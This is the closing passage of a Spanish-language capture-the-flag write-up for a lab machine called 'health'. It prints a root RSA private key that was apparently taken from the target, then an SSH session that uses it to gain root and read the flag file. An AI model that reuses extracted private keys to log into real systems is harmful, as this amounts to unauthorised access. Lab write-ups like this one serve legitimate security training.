+<code><span class="p">-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
+KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
+IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
+KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
+7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
+W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
+NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
+t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
+C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl
+hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8
+efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2
+1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj
+nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3
+sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou
+fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q
+0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ
+zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT
+rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB
+N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD
+SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o
+++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp
+UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a
+vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU
+6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm
+QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G
+-----END RSA PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Ahora solo nos queda conectarnos por ssh y terminamos la máquina</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">root@10.10.11.176 -i id_rsa
+</span><span class="s2">root@health</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@health</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.10.11.176 dead:beef::250:56ff:fe96:b4ff 
+</span><span class="s2">root@health</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt 
+112**************************db2
+</span><span class="s2">root@health</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
